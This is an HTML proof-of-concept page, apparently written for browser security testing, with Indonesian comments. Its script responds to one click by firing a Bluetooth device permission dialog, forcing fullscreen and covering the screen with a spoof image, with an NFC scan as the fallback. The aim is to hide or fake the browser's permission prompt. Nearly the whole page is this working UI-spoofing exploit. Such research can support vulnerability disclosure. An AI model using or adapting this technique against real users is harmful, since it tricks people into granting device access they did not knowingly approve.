<!DOCTYPE html>
<html lang="en">
<head>
    <title>Security UI Test - Permission Priority</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }         
        #spoof { width: 100%; height: 100%; display: none; object-fit: cover; position: fixed; z-index: 9999; }
        #content { display: flex; align-items: center; justify-content: center; height: 100vh; }
    </style>
</head>  
<body>
    <img id="spoof" src="spoof.png.jpeg">
    <div id="content">
        <div style="padding: 40px; border: 3px solid red; cursor: pointer;">
            <h1>KLIK UNTUK TEST</h1>
            <p>Memprioritaskan Dialog Izin</p>
        </div>
    </div>

    <script>
        window.onclick = async () => {
            const spoofImg = document.getElementById("spoof");
            const mainContent = document.getElementById("content");

            // STRATEGI: Panggil dialog izin TERLEBIH DAHULU sebelum fullscreen
            // Ini menggunakan "User Gesture" yang sama
            try {
                // Gunakan Bluetooth atau NFC sebagai pemicu dialog
                const p1 = navigator.bluetooth.requestDevice({ acceptAllDevices: true });
                
                // Segera eksekusi fullscreen saat dialog sedang diproses oleh sistem
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen();
                }

                // Ganti UI ke spoof
                spoofImg.style.display = "block";
                mainContent.style.display = "none";

                await p1; // Tunggu hasil dialog (jika diperlukan)
            } catch (e) {
                console.log("Dialog muncul atau diblokir: " + e.name);
                
                // Fallback: Jika Bluetooth gagal, langsung coba NFC
                try {
                    if ('NDEFReader' in window) {
                        const ndef = new NDEFReader();
                        await ndef.scan();
                    }
                } catch (err) {
                    console.log("NFC juga gagal.");
                }
            }
        };
    </script>
</body>
</html>
